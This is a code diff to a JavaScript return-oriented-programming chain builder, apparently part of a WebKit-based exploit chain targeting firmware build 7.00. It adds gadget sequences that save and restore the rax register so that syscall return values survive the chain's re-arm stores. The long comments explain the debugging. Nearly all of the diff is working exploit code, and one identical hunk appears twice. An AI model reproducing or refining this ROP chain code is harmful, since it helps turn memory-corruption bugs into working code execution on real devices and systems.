@@ -305,10 +305,35 @@ class rop {
             this.push(this.gadgets["pop rax"]);
             this.push(sysc);
             this.push(this.p.syscall_insn);
+            /* Preserve rax across the re-arm.
+               -----------------------------------------------------------
+               The caller's next act is write_result4(), which reads eax to
+               capture what the syscall returned. But the four push_write8
+               calls below go through push_store8, and on a build with
+               OFFSET_wk_store_via_rax -- which 7.00 is, because its
+               `mov [rdi], rsi` is unusable -- each one loads its value with
+               `pop rax`. So the syscall's return is overwritten four times
+               before anyone reads it, and the caller records whatever the
+               last store happened to leave behind.
+               That is what "cpuset_setaffinity returned 51834055" is: not a
+               kernel error code, just the tail of a gadget address. Save rax
+               to scratch first and reload it after, using `mov rax, [rax]`,
+               which is verified on this build. */
+            const sc = this.p.sysScratch;
+            if (sc) {
+                this.push(this.gadgets["pop rdi"]);
+                this.push(sc);
+                this.push(this.gadgets["mov [rdi], rax"]);
+            }
             this.push_write8(rp, this.gadgets["ret"]);
             this.push_write8(rp.add32(0x08), this.gadgets["pop rax"]);
             this.push_write8(rp.add32(0x10), sysc);
             this.push_write8(rp.add32(0x18), this.p.syscall_insn);
+            if (sc) {
+                this.push(this.gadgets["pop rax"]);
+                this.push(sc);
+                this.push(this.gadgets["mov rax, [rax]"]);
+            }
             return;
         }
 
@@ -323,10 +348,21 @@ class rop {
         }
         const target = proven || this.syscalls[sysc];
         this.push(target);
+        const sc2 = this.p.sysScratch;      // same rax problem as above
+        if (sc2) {
+            this.push(this.gadgets["pop rdi"]);
+            this.push(sc2);
+            this.push(this.gadgets["mov [rdi], rax"]);
+        }
         this.push_write8(restore_point, this.gadgets["ret"]);
         this.push_write8(restore_point.add32(0x08), this.gadgets["ret"]);
         this.push_write8(restore_point.add32(0x10), this.gadgets["ret"]);
         this.push_write8(restore_point.add32(0x18), target);
+        if (sc2) {
+            this.push(this.gadgets["pop rax"]);
+            this.push(sc2);
+            this.push(this.gadgets["mov rax, [rax]"]);
+        }
     }
 
    push_set_reg_from_rax(target_reg) {
@@ -471,10 +507,35 @@ class rop {
             this.push(this.gadgets["pop rax"]);
             this.push(sysc);
             this.push(this.p.syscall_insn);
+            /* Preserve rax across the re-arm.
+               -----------------------------------------------------------
+               The caller's next act is write_result4(), which reads eax to
+               capture what the syscall returned. But the four push_write8
+               calls below go through push_store8, and on a build with
+               OFFSET_wk_store_via_rax -- which 7.00 is, because its
+               `mov [rdi], rsi` is unusable -- each one loads its value with
+               `pop rax`. So the syscall's return is overwritten four times
+               before anyone reads it, and the caller records whatever the
+               last store happened to leave behind.
+               That is what "cpuset_setaffinity returned 51834055" is: not a
+               kernel error code, just the tail of a gadget address. Save rax
+               to scratch first and reload it after, using `mov rax, [rax]`,
+               which is verified on this build. */
+            const sc = this.p.sysScratch;
+            if (sc) {
+                this.push(this.gadgets["pop rdi"]);
+                this.push(sc);
+                this.push(this.gadgets["mov [rdi], rax"]);
+            }
             this.push_write8(rp, this.gadgets["ret"]);
             this.push_write8(rp.add32(0x08), this.gadgets["pop rax"]);
             this.push_write8(rp.add32(0x10), sysc);
             this.push_write8(rp.add32(0x18), this.p.syscall_insn);
+            if (sc) {
+                this.push(this.gadgets["pop rax"]);
+                this.push(sc);
+                this.push(this.gadgets["mov rax, [rax]"]);
+            }
             return;
         }
 
@@ -489,10 +550,21 @@ class rop {
         }
         const target = proven || this.syscalls[sysc];
         this.push(target);
+        const sc2 = this.p.sysScratch;      // same rax problem as above
+        if (sc2) {
+            this.push(this.gadgets["pop rdi"]);
+            this.push(sc2);
+            this.push(this.gadgets["mov [rdi], rax"]);
+        }
         this.push_write8(restore_point, this.gadgets["ret"]);
         this.push_write8(restore_point.add32(0x08), this.gadgets["ret"]);
         this.push_write8(restore_point.add32(0x10), this.gadgets["ret"]);
         this.push_write8(restore_point.add32(0x18), target);
+        if (sc2) {
+            this.push(this.gadgets["pop rax"]);
+            this.push(sc2);
+            this.push(this.gadgets["mov rax, [rax]"]);
+        }
     }
 
     push_inc8(dest, value) {
